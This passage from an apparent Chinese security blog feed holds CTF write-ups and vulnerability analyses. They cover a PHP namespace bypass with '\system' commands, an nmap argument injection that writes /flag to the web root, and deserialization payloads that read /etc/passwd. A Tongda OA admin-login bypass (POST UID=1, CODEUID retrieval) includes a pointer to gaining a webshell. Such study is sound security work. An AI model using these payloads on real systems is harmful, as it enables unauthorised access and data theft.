class="string">"shell_exec"</span>,<span class="string">"system"</span>,<span class="string">"passthru"</span>,<span class="string">"proc_open"</span>,<span class="string">"show_source"</span>,<span class="string">"phpinfo"</span>,<span class="string">"popen"</span>,<span class="string">"dl"</span>,<span class="string">"eval"</span>,<span class="string">"proc_terminate"</span>,<span class="string">"touch"</span>,<span class="string">"escapeshellcmd"</span>,<span class="string">"escapeshellarg"</span>,<span class="string">"assert"</span>,<span class="string">"substr_replace"</span>,<span class="string">"call_user_func_array"</span>,<span class="string">"call_user_func"</span>,<span class="string">"array_filter"</span>, <span class="string">"array_walk"</span>,  <span class="string">"array_map"</span>,<span class="string">"registregister_shutdown_function"</span>,<span class="string">"register_tick_function"</span>,<span class="string">"filter_var"</span>, <span class="string">"filter_var_array"</span>, <span class="string">"uasort"</span>, <span class="string">"uksort"</span>, <span class="string">"array_reduce"</span>,<span class="string">"array_walk"</span>, <span class="string">"array_walk_recursive"</span>,<span class="string">"pcntl_exec"</span>,<span class="string">"fopen"</span>,<span class="string">"fwrite"</span>,<span class="string">"file_put_contents"</span>);</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">gettime</span><span class="params">($func, $p)</span> </span>&#123;</div><div class="line">    $result = call_user_func($func, $p);</div><div class="line">    $a= gettype($result);</div><div class="line">    <span class="keyword">if</span> ($a == <span class="string">"string"</span>) &#123;</div><div class="line">        <span class="keyword">return</span> $result;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">""</span>;&#125;</div><div class="line">&#125;</div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</div><div class="line">    <span class="keyword">var</span> $p = <span class="string">"Y-m-d h:i:s a"</span>;</div><div class="line">    <span class="keyword">var</span> $func = <span class="string">"date"</span>;</div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;func != <span class="string">""</span>) &#123;</div><div class="line">            <span class="keyword">echo</span> gettime(<span class="keyword">$this</span>-&gt;func, <span class="keyword">$this</span>-&gt;p);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">$func = $_REQUEST[<span class="string">"func"</span>];</div><div class="line">$p = $_REQUEST[<span class="string">"p"</span>];    </div><div class="line"></div><div class="line"><span class="keyword">if</span> ($func != <span class="keyword">null</span>) &#123;</div><div class="line">    $func = strtolower($func);</div><div class="line">    <span class="keyword">if</span> (!in_array($func,$disable_fun)) &#123;</div><div class="line">        <span class="keyword">echo</span> gettime($func, $p);</div><div class="line">    &#125;<span class="keyword">else</span> &#123;</div><div class="line">        <span class="keyword">die</span>(<span class="string">"Hacker..."</span>);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>发现在代码层设置了<code>disable_function</code>，里面过滤了很多函数，而且要求执行结果返回的类型为字符串才能输出，这里很容易能想到之前做过的P牛星球的<code>Code-Breaking Puzzles挑战</code>,通过php命名空间进行绕过,原理方面，直接贴出之前的笔记,当然，前提要求是php7<br><img src="http://pic.c1imber.top/blog/20200517/lJWxnT4Jbfur.png?imageslim" alt="mark"></p><p>所以这里可以使用<code>\system</code>直接绕过，获取flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">func=\system&amp;p=find / -name *flag*</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20200517/5e34cxGbtmVW.png?imageslim" alt="mark"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">func=\system&amp;p=cat /tmp/flag_c6bf23b35ba2</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20200517/AK1W7XjoMXks.png?imageslim" alt="mark"></p><p><code>\phpinfo</code>查看环境，发现就是php7,所以这样就能直接秒了，不知道有没有其它解法==<br><img src="http://pic.c1imber.top/blog/20200517/xdSxJ7zuWg4S.png?imageslim" alt="mark"></p><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><p>应该是考察nmap的命令？？？<br>题目已经告诉flag在根目录了，直接输入<code>127.0.0.1&#39; -iL /flag -oN /var/www/html/aaa.txt 127.0.0.1</code>，读取<code>/flag</code>写入网站根目录，访问就能获取flag了<br><img src="http://pic.c1imber.top/blog/20200517/7strEvtiNk3u.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/20200517/JFMpgY8B1hjB.png?imageslim" alt="mark"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;phpweb&quot;&gt;&lt;a href=&quot;#phpweb&quot; class=&quot;headerlink&quot; title=&quot;phpweb&quot;&gt;&lt;/a&gt;phpweb&lt;/h3&gt;&lt;p&gt;打开页面查看源码，发现有个隐藏表单会固定时间自动提交一些参数，如下&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;htt
      
    
    </summary>
    
      <category term="ctf" scheme="https://c1aysec.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://c1aysec.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>2020网鼎杯青龙组-php反序列化</title>
    <link href="https://c1aysec.github.io/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://c1aysec.github.io/2020/05/10/2020网鼎杯青龙组-php反序列化/</id>
    <published>2020-05-10T08:51:05.550Z</published>
    <updated>2020-05-11T08:08:41.286Z</updated>
    
    <content type="html"><![CDATA[<h3 id="2020网鼎杯青龙组-php反序列化"><a href="#2020网鼎杯青龙组-php反序列化" class="headerlink" title="2020网鼎杯青龙组-php反序列化"></a>2020网鼎杯青龙组-php反序列化</h3><p>赛后拿到了题目的源码，搭到本地做了一遍，今天不比赛，先试试题目难度~</p><p>题目代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</div><div class="line"></div><div class="line">highlight_file(<span class="keyword">__FILE__</span>);</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">protected</span> $op;</div><div class="line">    <span class="keyword">protected</span> $filename;</div><div class="line">    <span class="keyword">protected</span> $content;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</div><div class="line">        $op = <span class="string">"1"</span>;</div><div class="line">        $filename = <span class="string">"/tmp/tmpfile"</span>;</div><div class="line">        $content = <span class="string">"Hello World!"</span>;</div><div class="line">        <span class="keyword">$this</span>-&gt;process();   </div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"1"</span>) &#123;</div><div class="line">            <span class="keyword">$this</span>-&gt;write();       </div><div class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"2"</span>) &#123;</div><div class="line">            $res = <span class="keyword">$this</span>-&gt;read();</div><div class="line">            <span class="keyword">$this</span>-&gt;output($res);</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Bad Hacker!"</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</div><div class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;filename.<span class="keyword">$this</span>-&gt;content;</div><div class="line">            <span class="keyword">if</span>(strlen((string)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</div><div class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">"Too long!"</span>);</div><div class="line">                <span class="keyword">die</span>();</div><div class="line">            &#125;</div><div class="line">            $res = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</div><div class="line">            <span class="keyword">if</span>($res) <span class="keyword">$this</span>-&gt;output(<span class="string">"Successful!"</span>);</div><div class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span> </span>&#123;</div><div class="line">        $res = <span class="string">""</span>;</div><div class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</div><div class="line">            $res = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> $res;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span><span class="params">($s)</span> </span>&#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">"[Result]: &lt;br&gt;"</span>;</div><div class="line">        <span class="keyword">echo</span> $s;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">"2"</span>)</div><div class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">"1"</span>;</div><div class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">""</span>;</div><div class="line">        <span class="keyword">$this</span>-&gt;process();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span><span class="params">($s)</span> </span>&#123;</div><div class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($s); $i++)</div><div class="line">        <span class="keyword">if</span>(!(ord($s[$i]) &gt;= <span class="number">32</span> &amp;&amp; ord($s[$i]) &lt;= <span class="number">125</span>))</div><div class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET&#123;<span class="string">'str'</span>&#125;)) &#123;</div><div class="line"></div><div class="line">    $str = (string)$_GET[<span class="string">'str'</span>];</div><div class="line">    <span class="keyword">if</span>(is_valid($str)) &#123;</div><div class="line">        $obj = unserialize($str);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure><p>大致过了遍代码，看到这里存在php反序列化,有两条利用链，分别对应文件的读和写操作，具体分析如下：</p><p>首先传入序列化字符串str，反序列化时触发FileHandler类的<code>__destruct</code>方法，这里会对<code>$this-&gt;op</code>的值进行判断，当<code>$this-&gt;op===&quot;2&quot;</code>，会将<code>$this-&gt;op</code>重新赋值为<code>&quot;1&quot;</code>,并将<code>$this-&gt;content</code>赋为空字符串；之后进入<code>process</code>方法，当<code>$this-&gt;op==&quot;1&quot;</code>时，进入<code>write</code>方法，但是由于这里<code>$this-&gt;content</code>的值被赋为了空字符串，所以不能向文件写入任何可控内容，导致“写”这一条利用链不能利用，所以要想办法绕过<code>__destruct</code>当中的判断，进行读文件的利用。</p><p>这里可以将<code>$this-&gt;op</code>的值设置为整型数字2进行绕过，因为在<code>__destruct</code>当中使用<code>===</code>进行了强比较，所以<code>2===&quot;2&quot;</code>结果为False，而在<code>process</code>方法中，使用了<code>==</code>进行比较，由于php弱类型，<code>2==&quot;2&quot;</code>结果为True，进入read函数</p><p>pop链构造如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">protected</span> $op=<span class="number">2</span>;</div><div class="line">    <span class="keyword">protected</span> $filename=<span class="string">"/etc/passwd"</span>;</div><div class="line">&#125;</div><div class="line">$a=<span class="keyword">new</span> FileHandler();</div><div class="line"><span class="keyword">echo</span> serialize($a);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>得到payload：<code>O:11:&quot;FileHandler&quot;:2:{s:5:&quot;*op&quot;;i:2;s:11:&quot;*filename&quot;;s:11:&quot;/etc/passwd&quot;;}</code></p><p>直接将上述字符传入str并不能读取成功，这是因为序列化字符串当中protected属性的影响，三种属性对应的序列化字符串格式如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">private:数据类型:属性名长度:&quot;\00类名\00属性名&quot;;数据类型:属性值长度:&quot;属性值&quot;;</div><div class="line">protected:数据类型:属性名长度:&quot;\00*\00属性名&quot;;数据类型:属性值长度:&quot;属性值&quot;;</div><div class="line">public:数据类型:属性名长度:&quot;属性名&quot;;数据类型:属性值长度:&quot;属性值&quot;;</div></pre></td></tr></table></figure><p>所以这里的payload实际上为：<code>O:11:&quot;FileHandler&quot;:2:{s:5:&quot;00*00op&quot;;i:2;s:11:&quot;00*00filename&quot;;s:11:&quot;/etc/passwd&quot;;}</code></p><p>因为存在protected属性，导致序列化字符串当中存在字符00，而在对字符串进行反序列化之前，这里的<code>is_valid</code>函数对字符串当中的字符进行了检查，要求其字符必须为可显示字符(ascii码值32-125)，所以这里要将payload改为:<code>O:11:&quot;FileHandler&quot;:2:{S:5:&quot;\00*\00op&quot;;i:2;S:11:&quot;\00*\00filename&quot;;s:11:&quot;/etc/passwd&quot;;}</code>，将s改为S</p><p><code>\00</code>三个字符均符合<code>!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125)</code>，所以这里读取成功<br><img src="http://pic.c1imber.top/blog/20200510/71LKiCfOBTXL.png?imageslim" alt="mark"></p><p>然后就可以通过任意文件读取获得flag了</p><p>5月11日补充：</p><p>题目环境buuoj上已经有了，今天看了颖奇L’Amore师傅的博客，对于这道题在这里需要补充几点</p><p>文章链接：<a href="https://www.gem-love.com/websecurity/2322.html?from=timeline&amp;isappinstalled=0" title="第二届“网鼎杯”青龙组WEB部分题目Writeup" target="_blank" rel="external">第二届“网鼎杯”青龙组WEB部分题目Writeup</a></p><p>文章里提到php7.1+版本对属性类型不敏感，所以在构造poc时直接将对象属性类型设为public也能绕过<code>is_valid</code>的检查，导致非预期解</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> $op=<span class="number">2</span>;</div><div class="line">    <span class="keyword">public</span> $filename=<span class="string">"/etc/passwd"</span>;</div><div class="line">&#125;</div><div class="line">$a=<span class="keyword">new</span> FileHandler();</div><div class="line"><span class="keyword">echo</span> serialize($a);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>payload:<code>O:11:&quot;FileHandler&quot;:2:{s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:11:&quot;/etc/passwd&quot;;}</code></p><p><img src="http://pic.c1imber.top/blog/20200511/Dr6rhw6oKEEs.png?imageslim" alt="mark"></p><p>另外需要注意的是，这里如果使用相对路径的话有可能会失败，原因在文章里也说了，在执行完序列化字符串后，如果没有出现异常就会穿越到根目录，导致读取不到flag.php，在本地环境<code>var_dump</code>一下<code>scandir(&quot;.&quot;)</code>和<code>$res</code>可以看到反序列化后跳到了根目录，获取<code>/flag.php</code>为<code>false</code>（本地php版本：7.0.33）</p><p>payload：<code>O:11:&quot;FileHandler&quot;:2:{S:5:&quot;\00*\00op&quot;;i:2;S:11:&quot;\00*\00filename&quot;;s:8:&quot;flag.php&quot;;}</code></p><p><img src="http://pic.c1imber.top/blog/20200511/kVLhM0tKsVHn.png?imageslim" alt="mark"></p><p>当使用相对路径读取失败时，可以尝试使用以下几种解法：</p><p>方法一：使用绝对路径，需要获取网站根目录，可以从apache配置文件当中获取跟目录，默认配置下，可以从<code>/etc/apache2/sites-available/000-default.conf</code>当中获取网站根目录</p><p>payload:<code>O:11:&quot;FileHandler&quot;:2:{s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:45:&quot;/etc/apache2/sites-available/000-default.conf&quot;;}</code></p><p><img src="http://pic.c1imber.top/blog/20200511/XSHqAV3BijwP.png?imageslim" alt="mark"></p><p>可以看到buuoj上这道题的环境没有修改根目录,所以直接读取<code>/var/www/html/flag.php</code>即可</p><p>payload:<code>O:11:&quot;FileHandler&quot;:2:{s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:22:&quot;/var/www/html/flag.php&quot;;}</code></p><p><img src="http://pic.c1imber.top/blog/20200511/7CAAH2Oy1nvE.png?imageslim" alt="mark"></p><p>而在比赛环境当中是修改了网站的根目录的，而且apache网站配置文件也不是上面说的那个，需要通过<code>/proc/self/cmdline</code>才能获取到网站的根目录</p><p>方法二：在反序列化字符串时触发异常，这样就不会跳转到根目录了</p><p>当序列化字符串当中属性个数大于实际个数时，就会触发异常，所以把payload修改为<code>O:11:&quot;FileHandler&quot;:3:{S:5:&quot;\00*\00op&quot;;i:2;S:11:&quot;\00*\00filename&quot;;s:8:&quot;flag.php&quot;;}</code>即可<br><img src="http://pic.c1imber.top/blog/20200511/M0Uz9TRM2iPU.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/20200511/eLaLY63pbFgg.png?imageslim" alt="mark"></p><p>另外，有一个奇怪的问题，经过测试发现，buuoj的题目环境通过相对路径就可以读取到flag.php，自己的docker环境也是这样（php版本:7.0.33），有点奇怪，不清楚是什么因素决定的，，，，</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;2020网鼎杯青龙组-php反序列化&quot;&gt;&lt;a href=&quot;#2020网鼎杯青龙组-php反序列化&quot; class=&quot;headerlink&quot; title=&quot;2020网鼎杯青龙组-php反序列化&quot;&gt;&lt;/a&gt;2020网鼎杯青龙组-php反序列化&lt;/h3&gt;&lt;p&gt;赛后拿到了题
      
    
    </summary>
    
      <category term="ctf" scheme="https://c1aysec.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://c1aysec.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>通达OA任意用户登录</title>
    <link href="https://c1aysec.github.io/2020/04/22/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95/"/>
    <id>https://c1aysec.github.io/2020/04/22/通达OA任意用户登录/</id>
    <published>2020-04-22T08:46:58.116Z</published>
    <updated>2020-04-24T09:40:29.302Z</updated>
    
    <content type="html"><![CDATA[<h1 id="通达OA任意用户登录"><a href="#通达OA任意用户登录" class="headerlink" title="通达OA任意用户登录"></a>通达OA任意用户登录</h1><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>分析文章：<a href="https://mp.weixin.qq.com/s/yJuLhC1GxkMbGL0mRORIoA" title="安恒信息应急响应中心" target="_blank" rel="external">https://mp.weixin.qq.com/s/yJuLhC1GxkMbGL0mRORIoA</a></p><p>本地测试版本：2017、v11.3,这两个版本，奇怪的是，在这两个版本的源码当中，都没有找到分析文章当中对<code>CODE_LOGIN.$CODEUID</code>进行判断的那块代码</p><p><img src="http://pic.c1imber.top/blog/20200422/KAn7dkt3wP2e.png?imageslim" alt="mark"></p><p>漏洞位置：</p><p>logincheck_code.php<br><img src="http://pic.c1imber.top/blog/20200422/rwElnHfsQSR6.png?imageslim" alt="mark"></p><p>这里<code>$UID</code>可控，当<code>$_POST[&#39;UID&#39;]</code>为1时，会直接从数据库USER表查询查询系统管理员的信息，然后直接将结果直接赋值给<code>$_SESSION</code>变量，获取系统管理员登录权限（缺少对<code>CODE_LOGIN.$CODEUID</code>的判断,导致直接POST传入UID=1即可获取系统管理员登录权限）</p><p><img src="http://pic.c1imber.top/blog/20200422/Si49nYzoD0Wy.png?imageslim" alt="mark"></p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">xxx/logincheck_code.php</div><div class="line"></div><div class="line">POST:UID=1</div><div class="line"></div><div class="line">之后访问xxx/general/index.php即可获取系统管理员权限</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20200422/AHJdAEDlkH6Y.png?imageslim" alt="mark"></p><p><img src="http://pic.c1imber.top/blog/20200422/o8zdvzknmwjW.png?imageslim" alt="mark"></p><p><img src="http://pic.c1imber.top/blog/20200422/xbCnkhHk3VoW.png?imageslim" alt="mark"></p><h3 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h3><p>访问xxx/logincheck_code.php，若返回<code>{&quot;status&quot;:1,&quot;msg&quot;:&quot;&quot;,&quot;url&quot;:&quot;general\/index.php?isIE=0&quot;}</code>的信息，基本可以确定存在漏洞<br><img src="http://pic.c1imber.top/blog/20200422/wfoUXXGfK0qe.png?imageslim" alt="mark"></p><p>影响范围还是挺大的，当进入后台后，可以在后台数据库管理的位置通过general_log获取网站的webshell</p><p>网站根目录的获取：系统管理-&gt;系统参数设置-&gt;OA服务设置</p><h3 id="2020-4-24补充"><a href="#2020-4-24补充" class="headerlink" title="2020.4.24补充"></a>2020.4.24补充</h3><p>终于下载到了通达OAv11.4版本：<a href="https://cdndown.tongda2000.com/oa/2019/TDOA11.4.exe" title="下载链接" target="_blank" rel="external">下载链接</a></p><p>查看漏洞位置logincheck_code.php,对比之前分析的v11.3和2017版本，可以看到增加了对<code>CODE_LOGIN.$CODEUID</code>的判断:<br><img src="http://pic.c1imber.top/blog/20200424/uvUkptTOx2mB.png?imageslim" alt="mark"></p><p>当<code>$login_codeuid = TD::get_cache(&quot;CODE_LOGIN&quot; . $CODEUID);</code>不存在或者为空时，会输出<code>{&quot;status&quot;:0,&quot;msg&quot;:&quot;参数错误&quot;,&quot;url&quot;:&quot;general\/index.php?isIE=0&quot;}</code>并退出程序，所以这里如果想登录，除了需要POST传入UID=1以外，还需要传入<code>CODEUID</code></p><p>全局查找<code>CODE_LOGIN</code>，在general/login_code.php当中，程序通过<code>$login_codeuid = getUniqid();</code>生成了<code>CODE_LOGIN</code>存入了缓存并输出<br><img src="http://pic.c1imber.top/blog/20200424/d0LKr0OdhY3L.png?imageslim" alt="mark"></p><p>这里就可以通过直接访问general/login_code.php获取缓存当中的<code>CODE_LOGIN</code>,通过获取到的<code>CODE_LOGIN</code>绕过logincheck_code.php的判断，获取系统管理员的登录权限</p><h3 id="v11-4版本漏洞检测及利用"><a href="#v11-4版本漏洞检测及利用" class="headerlink" title="v11.4版本漏洞检测及利用"></a>v11.4版本漏洞检测及利用</h3><p>直接访问logincheck_code.php，如果返回<code>{&quot;status&quot;:0,&quot;msg&quot;:&quot;\u53c2\u6570\u9519\u8bef\uff01&quot;,&quot;url&quot;:&quot;general\/index.php?isIE=0&quot;}</code>,则说明有可能存在漏洞</p><p>请求/general/login_code.php,获取codeuid<br><img src="http://pic.c1imber.top/blog/20200424/769EytU6Glfn.png?imageslim" alt="mark"></p><p>访问logincheck_code.php，POST传入UID=1和CODEUID=获取到的codeuid,即可获取系统管理员的登录权限<br><img src="http://pic.c1imber.top/blog/20200424/FciVx00ABsob.png?imageslim" alt="mark"></p><p><img src="http://pic.c1imber.top/blog/20200424/C4tSEqmgvdDY.png?imageslim" alt="mark"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;通达OA任意用户登录&quot;&gt;&lt;a href=&quot;#通达OA任意用户登录&quot; class=&quot;headerlink&quot; title=&quot;通达OA任意用户登录&quot;&gt;&lt;/a&gt;通达OA任意用户登录&lt;/h1&gt;&lt;h3 id=&quot;漏洞分析&quot;&gt;&lt;a href=&quot;#漏洞分析&quot; class=&quot;head
      
    
    </summary>
    
      <category term="漏洞分析" scheme="https://c1aysec.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="漏洞分析" scheme="https://c1aysec.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>phpweb前台任意文件上传</title>
    <link href="https://c1aysec.github.io/2020/01/10/phpweb%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <id>https://c1aysec.github.io/2020/01/10/phpweb前台任意文件上传/</id>
    <published>2020-01-09T16:07:20.714Z</published>
    <updated>2020-01-09T16:41:55.965Z</updated>
    
    <content type="html"><![CDATA[<h1 id="phpweb前台任意文件上传"><a href="#phpweb前台任意文件上传" class="headerlink" title="phpweb前台任意文件上传"></a>phpweb前台任意文件上传</h1><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>存在漏洞的代码位置：</p><p>/base/appplus.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//密钥校验</span></div><div class="line">$k=md5(strrev($dbUser.$dbPass));</div><div class="line">$h=$_SERVER[<span class="string">"HTTP_REFERER"</span>];</div><div 